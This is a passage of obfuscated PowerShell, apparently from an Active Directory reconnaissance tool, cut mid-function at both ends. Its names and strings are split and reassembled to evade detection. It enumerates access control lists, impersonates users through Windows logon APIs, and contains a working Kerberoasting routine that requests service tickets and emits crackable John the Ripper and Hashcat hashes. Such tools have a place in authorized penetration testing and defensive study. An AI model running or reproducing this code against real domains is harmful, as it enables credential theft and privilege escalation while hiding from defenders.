            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }

        If ($ADDomain)
        {
            Try
            {
                Write-Verbose ("{1}{5}{3}{8}{2}{4}{0}{7}{6}"-f' Cont','[*]','rat','nu','ing Root',' E','ts','ainer Objec','me')
                $Objs += Get-ADObject -SearchBase $($ADDomain."diST`IN`GUishe`DnaME") -SearchScope ("{0}{2}{1}" -f 'On','vel','eLe') -LDAPFilter ("{0}{2}{4}{3}{1}"-f '(obj','ner)','ectCl','s=contai','as') -Properties ("{3}{0}{2}{4}{1}" -f'isting','edName','u','D','ish'), ("{1}{0}" -f 'ame','N'), ("{2}{1}{0}{3}{4}"-f'ityde','tsecur','n','scrip','tor'), ("{2}{0}{1}" -f 'Cl','ass','Object')
            }
            Catch
            {
                Write-Warning ("{0}{14}{11}{12}{4}{5}{7}{2}{8}{1}{13}{3}{6}{9}{10}" -f '[','g','mera','a',' e','n','i','u','tin','ner Obje','cts','t-AD','RACL] Error while',' Root Cont','Ge')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }
        }

        If ($Objs)
        {
            $ACLObj = @()
            Write-Verbose "[*] Total Objects: $([ADRecon.ADWSClass]::ObjectCount($Objs)) "
            Write-Verbose ("{0}{1}{2}"-f'[-',']',' DACLs')
            $DACLObj =  (varIaBLe ('JWB1'+'8') ).VAlUe::("{0}{1}{2}" -f'DACL','Pars','er').Invoke($Objs, $GUIDs, $Threads)
            
            Write-Warning ("{11}{4}{13}{9}{3}{7}{2}{12}{5}{6}{0}{15}{1}{8}{10}{14}{16}" -f ' only s','por','ently, the ',' ','*','le',' is','- Curr','ted wi','ACLs','t','[','modu','] S','h L','up','DAP.')
            
            Remove-Variable ("{1}{0}"-f'js','Ob')
            Remove-Variable ("{0}{1}" -f 'GUID','s')
        }
    }

    If ($Method -eq ("{0}{1}"-f'LDA','P'))
    {
        $GUIDs = @{("{0}{1}{6}{5}{2}{4}{3}"-f '0000000','0-0','00-0000','00000','000','-00','000-0000') = 'All'}

        If ($Credential -ne   (  Variable  ("k"+"49p") -VaLU )::"EmP`Ty")
        {
            $DomainFQDN = Get-DNtoFQDN($objDomain."Di`s`TIngUIshEDn`Ame")
            $DomainContext = New-Object ("{1}{5}{11}{9}{12}{2}{6}{13}{10}{0}{16}{8}{3}{4}{14}{15}{7}" -f 'veDi','System','Services.','ctory.Di','r','.','Ac','text','e','re','i','Di','ctory','t','ectoryCo','n','r')(("{0}{1}"-f 'Doma','in'),$($DomainFQDN),$($Credential."uSe`R`Name"),$($Credential.("{2}{0}{5}{6}{3}{1}{4}" -f 'twork','denti','GetNe','e','al','C','r').Invoke()."p`ASswOrD"))
            Try
            {
                $ADDomain =  ( vaRiABLE IhYJ8Z  -VAlU  )::("{1}{2}{3}{0}"-f'in','G','etDo','ma').Invoke($DomainContext)
            }
            Catch
            {
                Write-Warning ("{3}{9}{1}{11}{4}{0}{8}{6}{5}{7}{10}{2}" -f'rr','e','xt','[','RACL] E','tting D',' ge','omain C','or','G','onte','t-AD')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }

            Try
            {
                $ForestContext = New-Object ("{12}{10}{0}{1}{14}{7}{8}{5}{3}{15}{11}{4}{2}{13}{9}{6}" -f'.','Di','Di','ervice','ctory.','oryS','ext','e','ct','ont','tem','tiveDire','Sys','rectoryC','r','s.Ac')(("{0}{1}{2}"-f 'Fo','re','st'),$($ADDomain."foR`ESt"),$($Credential."uS`ernamE"),$($Credential.("{3}{2}{4}{1}{5}{0}{6}"-f 'ia','r','Net','Get','wo','kCredent','l').Invoke()."PasS`wo`Rd"))
                $ADForest =   ( VaRIABle ('2g'+'o') -VALueoN)::("{1}{0}"-f 't','GetFores').Invoke($ForestContext)
                $SchemaPath = $ADForest."sC`hEmA"."n`Ame"
                Remove-Variable ("{0}{2}{1}" -f 'ADFo','est','r')
            }
            Catch
            {
                Write-Warning ("{0}{6}{8}{7}{2}{5}{1}{4}{3}"-f'[G','ting Schema','Error','th','Pa',' enumera','et','ACL] ','-ADR')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }
        }
        Else
        {
            $ADDomain =  (dIr vARiAbLE:IhyJ8z).VaLUe::("{3}{1}{0}{4}{2}"-f 't','urren','in','GetC','Doma').Invoke()
            $ADForest =  ( CHilDItEM ('VarIAB'+'l'+'e:2Go')).vaLUE::("{1}{3}{2}{4}{0}"-f 'entForest','GetC','r','u','r').Invoke()
            $SchemaPath = $ADForest."S`chEMA"."n`AME"
            Remove-Variable ("{1}{0}{2}"-f'DFore','A','st')
        }

        If ($SchemaPath)
        {
            Write-Verbose ("{6}{0}{4}{5}{2}{3}{1}"-f ' Enume','Ds','he','maI','rat','ing sc','[*]')
            If ($Credential -ne   (  VariabLe ("k49"+"p") -VAluEoNl)::"e`MpTY")
            {
                $objSearchPath = New-Object ("{5}{0}{7}{3}{2}{4}{8}{6}{1}"-f'ys','try','ectoryService','m.Dir','s.Dire','S','n','te','ctoryE') "LDAP://$($DomainController)/$($SchemaPath)", $Credential."Usern`A`me",$Credential.("{2}{0}{1}{3}{4}" -f't','Networ','Ge','kCre','dential').Invoke()."p`Asswo`Rd"
                $objSearcherPath = New-Object ("{11}{0}{9}{6}{5}{2}{12}{1}{4}{8}{10}{7}{3}"-f 'stem.Directo','ySe','.Direc','r','a','s','vice','he','r','rySer','c','Sy','tor') $objSearchPath
            }
            Else
            {
                $objSearcherPath = New-Object ("{0}{9}{10}{2}{5}{11}{1}{7}{8}{6}{3}{4}"-f'Sy','Service','m.Di','o','rySearcher','recto','irect','s.','D','st','e','ry') ([ADSI] "LDAP://$($SchemaPath)")
            }
            $objSearcherPath."pa`Gesi`ZE" = $PageSize
            $objSearcherPath."FIL`Ter" = (("{4}{3}{2}{1}{0}" -f'=*)','ID','U','chemaIDG','(s'))

            Try
            {
                $SchemaSearcher = $objSearcherPath.("{0}{2}{1}"-f 'F','All','ind').Invoke()
            }
            Catch
            {
                Write-Warning ("{6}{4}{3}{2}{5}{1}{0}" -f 'Ds','rating SchemaI','] Error','RACL','t-AD',' enume','[Ge')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }

            If ($SchemaSearcher)
            {
                $SchemaSearcher | Where-Object {$_} | ForEach-Object {
                    
                    $GUIDs[(New-Object ("{1}{0}" -f 'id','Gu') (,$_."prOP`eRTi`eS"."s`cHemA`IDgUId"[0]))."g`UId"] = $_."PR`OPer`TieS"."na`Me"[0]
                }
                $SchemaSearcher.("{1}{0}{2}" -f'ispo','d','se').Invoke()
            }
            $objSearcherPath.("{2}{1}{0}" -f 'se','ispo','d').Invoke()

            Write-Verbose ("{5}{7}{10}{9}{2}{1}{6}{8}{3}{0}{4}" -f 'Right',' Activ','ng',' ','s','[*] ','e Direct','E','ory','erati','num')
            If ($Credential -ne   $k49p::"EM`ptY")
            {
                $objSearchPath = New-Object ("{1}{4}{8}{0}{6}{9}{5}{2}{7}{3}" -f 'yS','S','D','ctoryEntry','ystem.Directo','es.','ervi','ire','r','c') (("LDAP://$($DomainController)/$($SchemaPath.replace("Schema","Extended-Rights"))")), $Credential."Us`ERN`AMe",$Credential.("{6}{3}{5}{4}{0}{1}{2}" -f 'ent','i','al','etNet','ed','workCr','G').Invoke()."p`ASsWO`Rd"
                $objSearcherPath = New-Object ("{12}{6}{3}{5}{1}{9}{4}{8}{2}{0}{11}{7}{10}" -f 'Dir','rect','.','m','v','.Di','te','torySe','ices','orySer','archer','ec','Sys') $objSearchPath
            }
            Else
            {
                $objSearcherPath = New-Object ("{5}{2}{0}{4}{1}{6}{3}"-f'DirectoryServic','irectorySear','ystem.','her','es.D','S','c') ([ADSI] (("LDAP://$($SchemaPath.replace("Schema","Extended-Rights"))")))
            }
            $objSearcherPath."PAgE`S`iZE" = $PageSize
            $objSearcherPath."f`ILteR" = (("{4}{2}{5}{1}{8}{6}{7}{0}{3}" -f'g','s','ctCl','ht)','(obje','a','ontrolAcc','essRi','s=c'))

            Try
            {
                $RightsSearcher = $objSearcherPath.("{2}{0}{1}"-f 'l','l','FindA').Invoke()
            }
            Catch
            {
                Write-Warning ("{14}{13}{1}{4}{9}{7}{15}{5}{3}{12}{16}{11}{8}{2}{10}{0}{6}" -f'ht','-','y ','ati','ADRACL] Error ','er','s','n','or','e','Rig','tive Direct','n','et','[G','um','g Ac')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }

            If ($RightsSearcher)
            {
                $RightsSearcher | Where-Object {$_} | ForEach-Object {
                    
                    $GUIDs[$_."PRo`PeR`TieS"."ri`Gh`TsgUid"[0].("{0}{2}{1}"-f 't','tring','oS').Invoke()] = $_."Pr`OP`ERTieS"."nA`ME"[0]
                }
                $RightsSearcher.("{0}{1}" -f 'dispo','se').Invoke()
            }
            $objSearcherPath.("{1}{0}{2}"-f's','di','pose').Invoke()
        }

        
        $Objs = @()
        Write-Verbose ("{12}{5}{3}{0}{10}{9}{4}{14}{1}{8}{7}{2}{11}{15}{6}{13}"-f 'u',' Us','p ','n',' ','E','e',' Computer and Grou','er,','ng Domain, OU,','merati','Ob','[*] ','cts','GPO,','j')
        $objSearcher = New-Object ("{1}{2}{7}{6}{12}{4}{0}{8}{5}{11}{3}{10}{9}"-f'c','S','yste','orySear','i','s','orySer','m.Direct','e','her','c','.Direct','v') $objDomain
        $ObjSearcher."PAG`e`siZe" = $PageSize
        $ObjSearcher."FiL`TEr" = (((("{13}{32}{19}{31}{2}{3}{34}{8}{24}{27}{6}{15}{25}{14}{26}{23}{30}{10}{38}{9}{18}{5}{11}{16}{7}{1}{0}{12}{4}{29}{17}{36}{20}{35}{21}{33}{28}{37}{22}" -f'0636','3','bj','ectCategory=organi','(samac','s','y=g','ntType=805','it)','pe=80530636','am','amA','9)','({','y','r','ccou','pe=268435456)','8)(','omain)','ccoun','2','type=536870913))','ainer)(','(obj','oupPolic','Cont','ectCategor','457)(sa','countty','s','(o','0}(objectClass=d','68435','zationalun','ttype=','(sama','maccounttype=536870912)(samaccount','AccountTy')) -F  [CHAr]124))
        
        $ObjSearcher."S`ECu`R`ItyMa`sks" =  $vy3::"dA`Cl" -bor   $vy3::"gR`OUp" -bor   $VY3::"oWn`Er" -bor  $Vy3::"s`Acl"
        $ObjSearcher."PrOPeRtiEs`To`Lo`AD".("{2}{0}{1}"-f 'd','dRange','A').Invoke((("{1}{2}{0}"-f'me','displa','yna'),("{3}{4}{0}{1}{2}"-f'uishe','d','name','d','isting'),("{1}{0}"-f'me','na'),("{1}{2}{3}{0}{4}" -f'ipto','nts','ecur','itydescr','r'),("{1}{0}{2}{3}"-f'bjectc','o','la','ss'),("{2}{1}{0}" -f 'jectsid','b','o')))
        $ObjSearcher."s`Earc`hsco`Pe" = ("{1}{0}" -f 'btree','Su')

        Try
        {
            $Objs += $ObjSearcher.("{1}{0}" -f 'All','Find').Invoke()
        }
        Catch
        {
            Write-Warning ("{3}{1}{7}{8}{20}{24}{9}{11}{17}{15}{18}{23}{25}{0}{16}{2}{5}{13}{21}{4}{19}{6}{12}{22}{14}{10}" -f'e','-A','omp','[Get','and','ut','Group','DRAC','L] E','e enumerati','s','ng ',' Obj','e','t','omain, ','r, C','D','O',' ','rror wh','r ','ec','U, GPO,','il',' Us')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }
        $ObjSearcher.("{2}{1}{0}"-f 'e','spos','di').Invoke()

        Write-Verbose ("{1}{0}{8}{7}{5}{6}{3}{4}{2}"-f 'numer','[*] E','jects','r',' Ob','nta','ine','oot Co','ating R')
        $objSearcher = New-Object ("{1}{8}{6}{7}{2}{0}{4}{5}{3}" -f'rect','System','vices.Di','er','ory','Search','orySe','r','.Direct') $objDomain
        $ObjSearcher."Pa`geS`iZE" = $PageSize
        $ObjSearcher."FiL`Ter" = (("{4}{3}{5}{2}{0}{1}" -f 'ss=contai','ner)','a','ct','(obje','Cl'))
        
        $ObjSearcher."SE`Cur`itymASkS" = $ObjSearcher."sE`C`UR`it`ymaskS" =  (ls vARiABlE:VY3 ).VAlUe::"D`ACL" -bor   $Vy3::"GRO`Up" -bor   ( item  VarIABLe:VY3).VaLUe::"oW`NER" -bor  (  VARiAbLE  vy3 -VAlueONl  )::"SA`CL"
        $ObjSearcher."PRoPeR`Ti`est`OLOAd".("{1}{0}{2}"-f'd','A','dRange').Invoke((("{2}{1}{3}{0}{4}" -f 'ishedn','ti','dis','ngu','ame'),("{1}{0}" -f 'ame','n'),("{2}{4}{0}{1}{6}{5}{3}"-f'ecurity','des','nt','ptor','s','i','cr'),("{1}{2}{0}" -f'ss','objec','tcla')))
        $ObjSearcher."s`eArCh`scOpE" = ("{0}{1}{2}" -f 'One','Leve','l')

        Try
        {
            $Objs += $ObjSearcher.("{0}{1}"-f'Fi','ndAll').Invoke()
        }
        Catch
        {
            Write-Warning ("{7}{9}{13}{2}{17}{5}{4}{1}{12}{10}{6}{15}{11}{16}{8}{0}{14}{3}"-f'er','ile enu','Er','s',' wh','or','ng R','[Ge','in','t-ADRACL','ati','o','mer','] ',' Object','o','t Conta','r')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }
        $ObjSearcher.("{0}{1}{2}" -f 'd','isp','ose').Invoke()

        If ($Objs)
        {
            Write-Verbose "[*] Total Objects: $([ADRecon.LDAPClass]::ObjectCount($Objs)) "
            Write-Verbose ("{0}{1}{2}"-f'[-] D','A','CLs')
            $DACLObj =   (  GeT-CHiLDiTem ("VAri"+"aB"+"LE:"+"S07D")).vALue::("{2}{3}{0}{1}" -f 'rs','er','DAC','LPa').Invoke($Objs, $GUIDs, $Threads)
            Write-Verbose ("{7}{0}{3}{5}{1}{2}{4}{6}"-f ' May ','ged',' ','need','A',' a Privile','ccount','[-] SACLs -')
            $SACLObj =  (GET-VARIABLE  S07d).valUE::("{2}{1}{3}{0}"-f'r','C','SA','LParse').Invoke($Objs, $GUIDs, $Threads)
            Remove-Variable ("{0}{1}" -f 'Ob','js')
            Remove-Variable ("{0}{1}"-f 'GUID','s')
        }
    }

    If ($DACLObj)
    {
        Export-ADR $DACLObj $ADROutputDir $OutputType ("{0}{1}" -f 'DA','CLs')
        Remove-Variable ("{2}{0}{1}"-f'CL','Obj','DA')
    }

    If ($SACLObj)
    {
        Export-ADR $SACLObj $ADROutputDir $OutputType ("{1}{0}" -f 'CLs','SA')
        Remove-Variable ("{0}{1}" -f 'SACLO','bj')
    }
}

Function GET`-AdrG`PoRepO`Rt
{

    param(
        [Parameter(mAnDaToRy = $true)]
        [string] $Method,

        [Parameter(MAndaTOrY = $true)]
        [bool] $UseAltCreds,

        [Parameter(MandAtoRy = $true)]
        [string] $ADROutputDir
    )

    If ($Method -eq ("{0}{1}" -f'A','DWS'))
    {
        Try
        {
            
            $SaveVerbosePreference = $script:VerbosePreference
            $script:VerbosePreference = ("{3}{1}{2}{4}{0}"-f'e','ilen','tl','S','yContinu')
            Import-Module ("{0}{2}{1}"-f 'G','icy','roupPol') -WarningAction ("{1}{0}"-f'p','Sto') -ErrorAction ("{0}{1}"-f'St','op') | Out-Null
            If ($SaveVerbosePreference)
            {
                $script:VerbosePreference = $SaveVerbosePreference
                Remove-Variable ("{2}{5}{1}{4}{3}{0}{6}"-f'nc','osePr','S','e','efer','aveVerb','e')
            }
        }
        Catch
        {
            Write-Warning ("{2}{8}{12}{0}{10}{6}{4}{7}{5}{1}{11}{3}{9}{13}{15}{14}" -f'R','g t','[Ge','licy Module. S','r','tin','port] E','ror impor','t','k','e','he GroupPo','-ADRGPO','ipping','eport',' GPOR')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            If ($SaveVerbosePreference)
            {
                $script:VerbosePreference = $SaveVerbosePreference
                Remove-Variable ("{1}{4}{3}{0}{2}"-f 'ePre','Sa','ference','Verbos','ve')
            }
            Return $null
        }
        Try
        {
            Write-Verbose ("{3}{2}{0}{4}{1}" -f 'OR',' XML','*] GP','[','eport')
            $ADFileName = -join($ADROutputDir,'\',("{0}{3}{2}{1}" -f 'GPO','port','e','-R'),("{0}{1}"-f '.x','ml'))
            Get-GPOReport -All -ReportType ("{0}{1}"-f 'X','ML') -Path $ADFileName
        }
        Catch
        {
            If ($UseAltCreds)
            {
                Write-Warning ("{0}{4}{7}{2}{5}{6}{1}{8}{3}" -f'[','ool usi','n','AS.','*] R',' th','e t','u','ng RUN')
                Write-Warning ((("{14}{11}{6}{8}{1}{15}{10}{2}{13}{3}{4}{12}{9}{7}{5}{0}" -f'xe','N>27p','e',' ','/neton','l.e','FQ','el','D','wersh','am','ser:<Domain ','ly po','>','[*] runas /u','<Usern')) -rEpLACe '27p',[CHaR]92)
                Return $null
            }
            Write-Warning ("{0}{4}{1}{7}{3}{13}{11}{8}{6}{10}{9}{5}{2}{12}"-f '[G','ORepor',' XM','Er','et-ADRGP','in','ting','t] ','t',' ',' the GPOReport','e','L','ror g')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }
        Try
        {
            Write-Verbose ("{3}{4}{2}{0}{1}" -f 'HTM','L',' ','[*] GP','OReport')
            $ADFileName = -join($ADROutputDir,'\',("{1}{0}{2}"-f'O-Repo','GP','rt'),("{1}{0}" -f 'tml','.h'))
            Get-GPOReport -All -ReportType ("{1}{0}"-f 'L','HTM') -Path $ADFileName
        }
        Catch
        {
            If ($UseAltCreds)
            {
                Write-Warning ("{6}{7}{5}{2}{4}{0}{3}{1}{8}"-f 'ol u','ing R','e ','s','to','th','[*','] Run ','UNAS.')
                Write-Warning ((("{0}{3}{6}{8}{7}{4}{9}{1}{2}{5}{10}"-f '[*] runas /','ly p','o','user:<Domain ','name> /ne','we','FQD','er','N>{0}<Us','ton','rshell.exe'))  -F[char]92)
                Return $null
            }
            Write-Warning ("{1}{2}{3}{10}{7}{8}{0}{5}{9}{4}{6}"-f 'ti','[Get-ADRGPOR','ep','o','ort','ng the GP',' in XML',' Er','ror get','ORep','rt]')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }
    }
    If ($Method -eq ("{1}{0}"-f'P','LDA'))
    {
        Write-Warning ("{4}{5}{1}{0}{3}{6}{7}{9}{2}{8}"-f ' module is',' Currently, the','t',' o','[','*]','nly supp','ort','h ADWS.','ed wi')
    }
}


Function gET-adRU`sErimPERSonA`T`i`on
{


    [OutputType([IntPtr])]
    [CmdletBinding(DEfAUlTPARAMeTerSeTnaMe = {"{2}{0}{1}"-f're','dential','C'})]
    Param(
        [Parameter(MANdAtOry = $True, paraMetErsETnAMe = "CR`eDENT`IAl")]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential,

        [Parameter(MAndaTORy = $True, pArAmEteRSEtNAMe = "T`OKe`NHANdlE")]
        [ValidateNotNull()]
        [IntPtr]
        $TokenHandle,

        [Switch]
        $Quiet
    )

    If (( (GeT-vaRiAbLE UoQPbm  -Valu)::"cURr`e`NtTH`Read".("{3}{4}{0}{2}{1}"-f 'ment','e','Stat','GetApa','rt').Invoke() -ne 'STA') -and (-not $PSBoundParameters[("{1}{0}"-f't','Quie')]))
    {
        Write-Warning ("{30}{2}{25}{27}{3}{14}{26}{28}{7}{8}{0}{23}{10}{18}{22}{5}{13}{20}{21}{29}{6}{16}{17}{9}{33}{12}{32}{4}{34}{19}{24}{15}{1}{31}{11}"-f '.',' ','User','e','s','ur','le-','r','shell','nt',' ','work.','tok','r','rsona','y','th','readed apartme','not','nation m','ently',' i',' c','exe is','a','Im','tion','p','] powe','n a sing','[Get-ADR','not ','en imper',' state, ','o')
    }

    If ($PSBoundParameters[("{0}{2}{1}"-f 'To','nHandle','ke')])
    {
        $LogonTokenHandle = $TokenHandle
    }
    Else
    {
        $LogonTokenHandle =   $1wEkx::"zE`RO"
        $NetworkCredential = $Credential.("{3}{1}{0}{4}{2}{5}"-f 'r','two','eden','GetNe','kCr','tial').Invoke()
        $UserDomain = $NetworkCredential."dO`maIN"
        If (-Not $UserDomain)
        {
            Write-Warning ((("{0}{21}{4}{16}{7}{14}{12}{22}{1}{13}{3}{10}{11}{18}{9}{5}{2}{19}{6}{8}{17}{15}{20}"-f '[G','e c','in','e','U','ma','N. ','rImper','(<Domain FQDN>KIE<','with Do','nt','ial','ati','red','son','ser','se','U',' ',' FQD','name>)','et-ADR','on] Us')) -RepLace([cHAR]75+[cHAR]73+[cHAR]69),[cHAR]92)
        }
        $UserName = $NetworkCredential."uSerna`me"
        Write-Warning "[Get-ADRUserImpersonation] Executing LogonUser() with user: $($UserDomain)\$($UserName) "

        
        
        $Result = $Advapi32::("{1}{2}{0}"-f'nUser','Log','o').Invoke($UserName, $UserDomain, $NetworkCredential."PAss`W`OrD", 9, 3, [ref]$LogonTokenHandle)
        $LastError =   ( get-vaRIabLE  iKW ).value::("{0}{1}{3}{5}{4}{2}"-f 'Ge','tLas','rror','t','2E','Win3').Invoke();

        If (-not $Result)
        {
            throw "[Get-ADRUserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
        }
    }

    
    $Result = $Advapi32::("{1}{3}{4}{2}{0}{5}"-f'se','Impers','dOnU','ona','teLogge','r').Invoke($LogonTokenHandle)

    If (-not $Result)
    {
        throw "[Get-ADRUserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
    }

    Write-Verbose ("{0}{20}{6}{13}{1}{19}{3}{2}{14}{16}{11}{7}{15}{12}{8}{18}{10}{5}{17}{9}{4}" -f'[','ersona','n] ','io','d','u','-ADR-UserI','a',' credenti','fully impersonate','s s','rn','e','mp','Alt','t','e','ccess','al','t','Get')
    $LogonTokenHandle
}


Function gE`T-`A`dRR`EvERTTos`elF
{


    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        $TokenHandle
    )

    If ($PSBoundParameters[("{1}{2}{0}" -f 'e','Tok','enHandl')])
    {
        Write-Warning ("{16}{8}{5}{2}{3}{10}{14}{11}{7}{4}{12}{15}{13}{6}{9}{17}{18}{0}{19}{1}"-f 'User() toke','ndle','DRReve','rtTo','ng token impersona','t-A','and c','i','Ge','l','Self] ','evert','t','on ','R','i','[','osing ','Logon','n ha')
        $Result = $Kernel32::("{0}{3}{1}{2}" -f'C','oseHa','ndle','l').Invoke($TokenHandle)
    }

    $Result = $Advapi32::("{1}{0}{2}"-f'ToSel','Revert','f').Invoke()
    $LastError =   (  gI  ("vA"+"R"+"IablE:"+"IKw")).value::("{3}{4}{2}{1}{0}"-f '32Error','in','stW','G','etLa').Invoke();

    If (-not $Result)
    {
        Write-Error "[Get-ADRRevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
    }

    Write-Verbose ("{0}{2}{10}{11}{3}{1}{8}{6}{5}{4}{9}{7}"-f'[Get-AD','ken ','R',' To','ssfully','e','personation succ','ted','im',' rever','Rever','tToSelf]')
}


Function GEt-a`drsP`Nt`ICket
{

    param(
        [Parameter(MANDATORy = $true)]
        [string] $UserSPN
    )

    Try
    {
        $Null =   $29RW::("{4}{3}{0}{1}{2}"-f 'ithPa','rt','ialName','adW','Lo').Invoke(("{0}{3}{6}{4}{1}{2}{5}" -f 'Sy','n','tityMode','st','de','l','em.I'))
        $Ticket = New-Object ("{6}{5}{10}{8}{0}{4}{9}{2}{1}{7}{3}" -f'r','curi','storSe','oken','osRequ','ityModel.Tok','System.Ident','tyT','be','e','ens.Ker') -ArgumentList $UserSPN
    }
    Catch
    {
        Write-Warning ('['+'Ge'+'t-A'+'DRSPNT'+'ick'+'et]'+' '+'E'+'rror '+'re'+'q'+'uesting '+'ti'+'cket '+'fo'+'r '+'SP'+'N '+"$UserSPN")
        Write-Warning "[EXCEPTION] $($_.Exception.Message) "
        Return $null
    }

    If ($Ticket)
    {
        $TicketByteStream = $Ticket.("{2}{0}{1}"-f'u','est','GetReq').Invoke()
    }

    If ($TicketByteStream)
    {
        $TicketHexStream =   (geT-VarIaBlE ("Qj"+"c") -valuEonl)::("{0}{1}"-f'ToSt','ring').Invoke($TicketByteStream) -replace '-'

        
        
        If ($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)')
        {
            $Etype =   ( geT-vARIaBLE  ("5"+"E974") ).VAlUE::("{1}{0}" -f'yte','ToB').Invoke( $Matches."e`TYpeLen", 16 )
            $CipherTextLen =  ( lS  ("VARiaBl"+"E:"+"5e974")  ).VAluE::("{0}{1}{2}"-f'ToUInt','3','2').Invoke($Matches."ci`pH`ERTE`XTlEN", 16)-4
            $CipherText = $Matches."DATAT`oeND".("{2}{0}{1}"-f'ubst','ring','S').Invoke(0,$CipherTextLen*2)

            
            If ($Matches."Da`T`AtOenD".("{0}{1}{2}" -f'Sub','str','ing').Invoke($CipherTextLen*2, 4) -ne ("{1}{0}"-f'482','A'))
            {
                Write-Warning ('[G'+'et-ADRSP'+'NTicke'+'t'+'] '+'E'+'rror '+'pa'+'rsing'+' '+'c'+'iphe'+'rte'+'xt '+'fo'+'r '+'the'+' '+'SPN'+' '+' '+('Z'+'ap(Z'+'apTic'+'ke'+'t.ServicePrin'+'cipalNa'+'me).')."Re`pl`ACE"(([chAR]90+[chAR]97+[chAR]112),'$')) 
                $Hash = $null
            }
            Else
            {
                $Hash = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
            }
        }
        Else
        {
            Write-Warning "[Get-ADRSPNTicket] Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). " 
            $Hash = $null
        }
    }
    $Obj = New-Object ("{0}{1}{2}"-f'PSO','bje','ct')
    $Obj | Add-Member -MemberType ("{3}{0}{2}{1}"-f 'te','perty','Pro','No') -Name ("{4}{2}{1}{0}{6}{3}{5}" -f 'ip','Princ','ce','m','Servi','e','alNa') -Value $Ticket."sEr`Vi`CepRiN`CIpa`lNamE"
    $Obj | Add-Member -MemberType ("{0}{2}{1}" -f'Note','ty','Proper') -Name ("{0}{1}"-f'E','type') -Value $Etype
    $Obj | Add-Member -MemberType ("{0}{1}{2}" -f'Note','Proper','ty') -Name ("{1}{0}"-f'sh','Ha') -Value $Hash
    Return $Obj
}

Function geT-AD`RKe`R`B`ER`OaST
{

    param(
        [Parameter(mandATORy = $true)]
        [string] $Method,

        [Parameter(MandAtoRy = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(maNdaTORY = $false)]
        [Management.Automation.PSCredential] $Credential =  $k49p::"EM`ptY",

        [Parameter(maNDAtORY = $true)]
        [int] $PageSize
    )

    If ($Credential -ne  (  gEt-VArIAble  ("K"+"49p")  ).vaLuE::"em`Pty")
    {
        $LogonToken = Get-ADRUserImpersonation -Credential $Credential
    }

    If ($Method -eq ("{0}{1}"-f 'ADW','S'))
    {
        Try
        {
            $ADUsers = Get-ADObject -LDAPFilter (("{13}{15}{4}{7}{22}{0}{6}{11}{3}{12}{8}{18}{10}{17}{2}{5}{21}{20}{14}{1}{16}{9}{19}"-f 'er)(','6.','cco','cePrincip','c','untContr','ser','tCla','Na','.80','r','vi','al','(&(!o','.11355','bje','1.4','A','me=*)(!use','3:=2))','0','ol:1.2.84','ss=comput')) -Properties ("{3}{1}{0}{2}"-f'n','ou','tName','sAMAcc'),("{3}{2}{0}{1}{5}{4}"-f 'r','inci','erviceP','s','me','palNa'),("{0}{2}{3}{1}" -f 'Dis','e','t','inguishedNam') -ResultPageSize $PageSize
        }
        Catch
        {
            Write-Warning ("{6}{7}{12}{9}{11}{10}{1}{4}{14}{8}{15}{0}{3}{2}{5}{13}"-f'atin','or wh',' Obje','g UserSPN','i','c','[Get','-ADRK','e','roa','] Err','st','erbe','ts','le ','numer')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADUsers)
        {
            $UserSPNObj = @()
            $ADUsers | ForEach-Object {
                ForEach ($UserSPN in $_."s`erv`icep`Ri`NCIp`AlnAmE")
                {
                    $Obj = New-Object ("{1}{0}"-f'bject','PSO')
                    $Obj | Add-Member -MemberType ("{0}{3}{1}{2}" -f 'No','roper','ty','teP') -Name ("{2}{1}{0}" -f'me','serna','U') -Value $_."s`AMa`cC`OUntNAME"
                    $Obj | Add-Member -MemberType ("{2}{3}{0}{1}" -f 'P','roperty','Not','e') -Name ("{0}{4}{3}{2}{1}" -f'Servi','ame','lN','incipa','cePr') -Value $UserSPN

                    $HashObj = Get-ADRSPNTicket $UserSPN
                    If ($HashObj)
                    {
                        $UserDomain = $_."D`istI`Ng`UiShEdNaMe".("{1}{0}" -f'ring','SubSt').Invoke($_."DiST`in`gui`SHeDn`AMe".("{1}{2}{0}" -f 'xOf','In','de').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        
                        $JTRHash = "`$krb5tgs`$$($HashObj.ServicePrincipalName):$($HashObj.Hash)"
                        
                        $HashcatHash = "`$krb5tgs`$$($HashObj.Etype)`$*$($_.SamAccountName)`$$UserDomain`$$($HashObj.ServicePrincipalName)*`$$($HashObj.Hash)"
                    }
                    Else
                    {
                        $JTRHash = $null
                        $HashcatHash = $null
                    }
                    $Obj | Add-Member -MemberType ("{1}{0}{2}" -f'Prope','Note','rty') -Name ("{0}{1}" -f 'Jo','hn') -Value $JTRHash
                    $Obj | Add-Member -MemberType ("{1}{0}{2}"-f'r','NoteP','operty') -Name ("{0}{2}{1}" -f'H','t','ashca') -Value $HashcatHash
                    $UserSPNObj += $Obj
                }
            }
            Remove-Variable ("{1}{0}{2}" -f'se','ADU','rs')
        }
    }

    If ($Method -eq ("{0}{1}"-f'LD','AP'))
    {
        $objSearcher = New-Object ("{6}{3}{5}{7}{8}{4}{2}{1}{0}"-f 'er','orySearch','ect','yst','ir','em.Dir','S','ectoryServices.','D') $objDomain
